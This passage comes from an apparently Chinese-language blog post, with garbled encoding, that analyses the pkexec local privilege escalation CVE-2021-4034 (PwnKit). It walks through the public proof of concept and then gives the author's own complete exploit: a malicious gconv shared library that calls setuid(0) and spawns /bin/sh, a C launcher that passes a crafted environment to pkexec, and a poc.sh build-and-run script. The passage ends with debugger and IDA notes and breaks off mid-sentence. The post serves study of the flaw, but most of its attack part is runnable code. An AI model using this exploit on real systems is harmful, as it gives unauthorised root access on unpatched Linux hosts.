class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;you be hacked alreadly!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;touch you_be_hacked.txt&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export CHARSET=HACK</span><br><span class=\"line\">export GCONV_PATH=.</span><br><span class=\"line\"></span><br><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br><span class=\"line\">echo &quot;module HACK// UTF-8// hack 1&quot; &gt; gconv-modules</span><br></pre></td></tr></table></figure>\n<p>è¿™æ ·å°±å¸ƒç½®å¥½äº†æ‰€æœ‰å‡†å¤‡ï¼Œç„¶åæ‰‹åŠ¨è°ƒç”¨ <code>iconv</code> ï¼Œè™½ç„¶æˆ‘æƒ³ç”¨ <code>g_printerr</code> ? ä½†æ˜¯ç¼–è¯‘ä¸é€šï¼Ÿï¼Ÿ<br>\nhackedï¼</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/iconv$ iconv -f HACK -t UTF-8 &lt; hack.c</span><br><span class=\"line\">you be hacked alreadly!</span><br><span class=\"line\">iconv: iconv.c:91: iconv: Assertion `!&quot;Nothing like this should happen&quot;&#x27; failed.</span><br><span class=\"line\">Aborted (core dumped)</span><br></pre></td></tr></table></figure>\n<h3 id=\"moduleè¯­æ³•\"><a class=\"markdownIt-Anchor\" href=\"#moduleè¯­æ³•\">#</a> module è¯­æ³•</h3>\n<p><a href=\"https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html\">https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module AAAA// BBBB// name 1</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ä» AAAAç¼–ç åˆ° BBBBç¼–ç  æ ¹æ®name.soè§„åˆ™ æ¶ˆè€—castå€¼ä¸º1</span></span><br></pre></td></tr></table></figure>\n<p>ç„¶å <code>iconv</code>  ä¸çŸ¥é“ <code>CHARSET</code>  ä¸­çš„ <code>HACK</code>  æ˜¯ä»€ä¹ˆå­—ç¬¦é›†ï¼Œå°±ä¼šæ‰¾åˆ° <code>GCONV_PATH</code>  è·¯å¾„ä¸‹çš„ <code>gconv_modules</code>  å»æ‰¾è§£ç å·¥å…·ï¼Œç„¶åå°±è½å…¥æˆ‘ä»¬çš„æ¶æ„åº“äº†ï¼Œæ‰€ä»¥èƒ½æ§åˆ¶ <code>GCONV_PATH</code>  å°±èƒ½æ¶æ„ä»£ç æ‰§è¡Œ</p>\n<h2 id=\"åˆ†æpoc\"><a class=\"markdownIt-Anchor\" href=\"#åˆ†æpoc\">#</a> åˆ†æ POC</h2>\n<h3 id=\"makeåšçš„äº‹\"><a class=\"markdownIt-Anchor\" href=\"#makeåšçš„äº‹\">#</a> make åšçš„äº‹</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class=\"line\">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class=\"line\">echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules</span><br><span class=\"line\">mkdir -p GCONV_PATH=.</span><br><span class=\"line\">cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.</span><br></pre></td></tr></table></figure>\n<p>å…ˆæ˜¯åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº† <code>pwnkit.so</code>  çš„åº“<br>\nç„¶åç¼–è¯‘äº† <code>cve-2021-4034</code> <br>\n ç„¶åä¼ å…¥ä¸€å¥è¯ç»™ <code>gconv-modules</code> <br>\n åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåå­—ä¸º <code>GCONV_PATH=.</code> <br>\n æœ€å cp <code>/usr/bin/true</code>  åˆ° <code>GCONV_PATH=.</code>  æ–‡ä»¶å¤¹è·¯å¾„ä¸‹çš„ <code>pwnkit.so:.</code>  é‡Œå» <code>-f</code>  æ˜¯ force å¼ºåˆ¶æŠŠ <code>/usr/bin/true</code>  è¿™ä¸ªæ–‡ä»¶ cp åˆ°ç›®æ ‡è·¯å¾„ï¼Œå› ä¸º <code>pkexec</code>  è¦æ‰§è¡Œ <code>PATH</code>  è·¯å¾„ä¸‹çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°±å¿…é¡»è®© pkexec ç©ºæ‰§è¡Œï¼Œæ‰€ä»¥ç›®æ ‡å°±è¢«æ›¿æ¢æˆ <code>true</code> ï¼Œæ€ä¹ˆæ‰§è¡Œéƒ½ä¸ä¼šå‡ºé”™<br>\nå½“å‰ç›®å½•ç»“æ„</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.c</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.sh</span><br><span class=\"line\">â”œâ”€â”€ dry-run</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ dry-run-cve-2021-4034.c</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”‚Â Â  â””â”€â”€ pwnkit-dry-run.c</span><br><span class=\"line\">â”œâ”€â”€ LICENSE</span><br><span class=\"line\">â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”œâ”€â”€ pwnkit.c</span><br><span class=\"line\">â””â”€â”€ README.md</span><br></pre></td></tr></table></figure>\n<p>make ä¹‹åçš„</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.c</span><br><span class=\"line\">â”œâ”€â”€ cve-2021-4034.sh</span><br><span class=\"line\">â”œâ”€â”€ dry-run</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ dry-run-cve-2021-4034.c</span><br><span class=\"line\">â”‚Â Â  â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”‚Â Â  â””â”€â”€ pwnkit-dry-run.c</span><br><span class=\"line\">â”œâ”€â”€ gconv-modules</span><br><span class=\"line\">â”œâ”€â”€ GCONV_PATH=.</span><br><span class=\"line\">â”‚Â Â  â””â”€â”€ pwnkit.so:.</span><br><span class=\"line\">â”œâ”€â”€ LICENSE</span><br><span class=\"line\">â”œâ”€â”€ Makefile</span><br><span class=\"line\">â”œâ”€â”€ pwnkit.c</span><br><span class=\"line\">â”œâ”€â”€ pwnkit.so</span><br><span class=\"line\">â””â”€â”€ README.md</span><br></pre></td></tr></table></figure>\n<h3 id=\"cve-2021-4034c\"><a class=\"markdownIt-Anchor\" href=\"#cve-2021-4034c\">#</a> cve-2021-4034.c</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">include &lt;unistd.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char **argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar * const args[] = &#123;</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tchar * const environ[] = &#123;</span><br><span class=\"line\">\t\t&quot;pwnkit.so:.&quot;,</span><br><span class=\"line\">\t\t&quot;PATH=GCONV_PATH=.&quot;,</span><br><span class=\"line\">\t\t&quot;SHELL=/lol/i/do/not/exists&quot;,</span><br><span class=\"line\">\t\t&quot;CHARSET=PWNKIT&quot;,</span><br><span class=\"line\">\t\t&quot;GIO_USE_VFS=&quot;,</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\treturn execve(&quot;/usr/bin/pkexec&quot;, args, environ);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€ä¸ªç¯å¢ƒå˜é‡æŒ‡å‘ <code>pwnkit.so:.</code> ï¼Œæ‹¼æ¥åå°±æ˜¯ <code>GCONV_PATH=./pwnkit.so:.</code> <br>\n <code>:</code>  çš„ä½œç”¨æˆ‘åœ¨ç½‘ä¸Šéƒ½æ²¡æŸ¥åˆ°å¾ˆå¥½çš„ä»‹ç»ï¼Œæˆ‘ç†è§£ä¸ºäºŒçº§æŒ‡é’ˆä¼šéå†ç”± <code>:</code>  åˆ†å‰²çš„è·¯å¾„ï¼Œï¼Œï¼Œ<br>\nä¹Ÿå°±æ˜¯ç¬¬äºŒè½®å¾ªç¯ä¼šå˜æˆ <code>GCONV_PATH=.</code> ï¼Œå¼•å¯¼å‘å½“æ—¶çš„æ¶æ„åº“</p>\n<h3 id=\"pwnkitc\"><a class=\"markdownIt-Anchor\" href=\"#pwnkitc\">#</a> pwnkit.c</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> args[] = &#123; <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> environ[] = &#123; <span class=\"string\">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>], args, environ);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸ªå°±æ˜¯ä¼ªé€ çš„ <code>gconv-mudules</code>  ä¸‹çš„ <code>so</code>  æ–‡ä»¶ï¼Œä¼šæ‰§è¡Œ <code>gconv</code>  å’Œ <code>gconv_init</code> <br>\n è¿™ä¸ª <code>PATH</code>  å°±æ˜¯å¤šä¸ªå¯èƒ½çš„ bin ç›®æ ‡ä¾æ¬¡éå†<br>\nè¿™å°±æ˜¯ shellcode äº†<br>\nå…³äºè¿™ä¸ª <code>setuid</code>  å’Œ <code>setgid</code>  æˆ‘é‡æ–°å¼€ä¸€ç« åˆ†æ</p>\n<h2 id=\"å°¾å£°\"><a class=\"markdownIt-Anchor\" href=\"#å°¾å£°\">#</a> å°¾å£°</h2>\n<p>æ—¢ç„¶è‡ªå·±åˆ†æå®Œäº†ï¼Œå°±è¦è‡ªå·±å†™åˆ©ç”¨è„šæœ¬<br>\né¦–å…ˆæ˜¯æ¶æ„åº“</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> envp[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin:/opt/bin&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>],args,envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œç”¨ <code>args</code>  çš„ç›®çš„å°±æ˜¯ä¸ºäº†è¯­å¥å¤ç”¨ï¼Œæ²¡å•¥ç‰¹åˆ«å«ä¹‰ï¼Œä¹Ÿèƒ½æ‹†æˆ <code>/bin/sh</code> + <code>argv</code> <br>\npkexec æ‰§è¡Œçš„ææƒ</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> **argv)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> environ[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;evilib.so:.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;SHELL=/are/you/kid/me&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;CHARSET=HACK&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(<span class=\"string\">&quot;/usr/bin/pkexec&quot;</span>,args,environ);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://poc.sh\">poc.sh</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o exp exp.c</span><br><span class=\"line\">mkdir GCONV_PATH=.</span><br><span class=\"line\">gcc -fPIC -shared -o ./evilib.so evilib.c</span><br><span class=\"line\">echo &quot;module UTF-8// HACK// evilib 1&quot; &gt; gconv-modules</span><br><span class=\"line\">cp -f /usr/bin/true ./GCONV_PATH=./evilib.so:.</span><br><span class=\"line\">./exp</span><br></pre></td></tr></table></figure>\n<h2 id=\"è¡¥å……è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#è¡¥å……è°ƒè¯•\">#</a> è¡¥å……è°ƒè¯•</h2>\n<p><a href=\"https://hub.docker.com/r/chenaotian/cve-2021-4034\">https://hub.docker.com/r/chenaotian/cve-2021-4034</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">catch exec</span><br><span class=\"line\">r</span><br><span class=\"line\">b *$rebase(0x2380)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png\" alt=\"image\"></p>\n<p>ä¸¤æ¬¡ç»“æœå¯¹æ¯”</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">02:0010â”‚     0x7fffa507a720 â€”â–¸ 0x7fffa507bfad â—‚â€” &#x27;pwnkitdir&#x27;</span><br><span class=\"line\">03:0018â”‚     0x7fffa507a728 â€”â–¸ 0x7fffa507bfb7 â—‚â€” &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">04:0020â”‚     0x7fffa507a730 â€”â–¸ 0x7fffa507bfc9 â—‚â€” &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">05:0028â”‚     0x7fffa507a738 â€”â–¸ 0x7fffa507bfd8 â—‚â€” &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00:0000â”‚ rax 0x7fffa507a720 â€”â–¸ 0x55b966a37f50 â—‚â€” &#x27;GCONV_PATH=./pwnkitdir&#x27;</span><br><span class=\"line\">01:0008â”‚     0x7fffa507a728 â€”â–¸ 0x7fffa507bfb7 â—‚â€” &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">02:0010â”‚     0x7fffa507a730 â€”â–¸ 0x7fffa507bfc9 â—‚â€” &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">03:0018â”‚     0x7fffa507a738 â€”â–¸ 0x7fffa507bfd8 â—‚â€” &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<p>ida å®¡è®¡åˆ°</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> ( *v19 != <span class=\"string\">&#x27;/&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    program_in_path = g_find_program_in_path(v19);</span><br><span class=\"line\">    v21 = program_in_path;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( program_in_path )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v22 = v7;</span><br><span class=\"line\">      v7 = (gchar *)program_in_path;</span><br><span class=\"line\">      g_free(v22);</span><br><span class=\"line\">      *(_QWORD *)opt_usera = v21; &lt;&lt;--------------------- argv[n] = path = s;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_34;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v38 = v7;</span><br><span class=\"line\">    v37 = strerror(<span class=\"number\">2</span>);</span><br><span class=\"line\">    v36 = <span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>;</span><br><span class=\"line\">LABEL_55:</span><br><span class=\"line\">    v8 = <span class=\"number\">127</span>;</span><br></pre></td></tr></table></figure>\n<p>æ ¹æ®å­—ç¬¦ä¸²å®šä½åˆ°</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(type, <span class=\"string\">&quot;SHELL&quot;</span>) )<span class=\"comment\">// è·å–åˆ°SHELLçš„ç¯å¢ƒå˜é‡</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v151 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        v152[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v28 = <span class=\"number\">0</span>;</span><br><span class=\"line\">          v29 = g_strsplit(v151, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0LL</span>);<span class=\"comment\">//shells</span></span><br><span class=\"line\">          <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">          &#123;<span class=\"comment\">// å¦‚æœç»ˆæ­¢æ¡ä»¶æ»¡è¶³</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !v29 || (v30 = *(_QWORD *)(v29 + <span class=\"number\">8LL</span> * v28)) == <span class=\"number\">0</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v31 = v29;</span><br><span class=\"line\">              v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">              v7 = local_agent_handle;</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_47;<span class=\"comment\">// ç›´æ¥è·³è¿‡å»</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(v27, v30) )</span><br><span class=\"line\">              <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            ++v28;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          g_free(v151);</span><br><span class=\"line\">          g_strfreev(v29);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_58;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">        v7 = local_agent_handle;</span><br><span class=\"line\">        v31 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        g_printerr(<span class=\"string\">&quot;Error getting contents of /etc/shells: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(v152[<span class=\"number\">0</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        g_error_free(v152[<span class=\"number\">0</span>]);</span><br><span class=\"line\">LABEL_47:</span><br><span class=\"line\">        g_free(v151);</span><br><span class=\"line\">        g_strfreev(v31);</span><br><span class=\"line\">        log_message(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">LABEL_48:</span><br><span class=\"line\">        v32 = <span class=\"string\">&quot;\\nThis incident has been reported.\\n&quot;</span>;</span><br><span class=\"line\">LABEL_49:</span><br><span class=\"line\">        v8 = <span class=\"number\">127</span>;</span><br><span class=\"line\">        g_printerr(v32);</span><br><span class=\"line\">        g_free(<span class=\"number\">0LL</span>);</span><br></pre></td></tr></table></figure>\n<p><code>v28</code>  æ˜¯ 